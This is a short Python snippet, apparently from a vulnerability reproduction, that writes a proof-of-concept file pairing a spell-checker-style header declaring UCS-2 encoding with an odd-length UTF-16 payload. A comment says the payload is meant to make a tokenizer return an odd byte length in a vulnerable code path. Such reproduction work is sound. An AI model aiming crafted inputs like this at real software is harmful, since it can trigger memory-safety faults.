from pathlib import Path
# Odd number of UCS-2 code units makes tokenizer return odd byte length in vulnerable path.
data = b'lang=en_US\nencoding=ucs-2\nsug-mode=ultra\nmode=none\n\n' + 'zzzzz'.encode('utf-16le')
Path('/workspace/poc2').write_bytes(data)
print(len(data))
PY
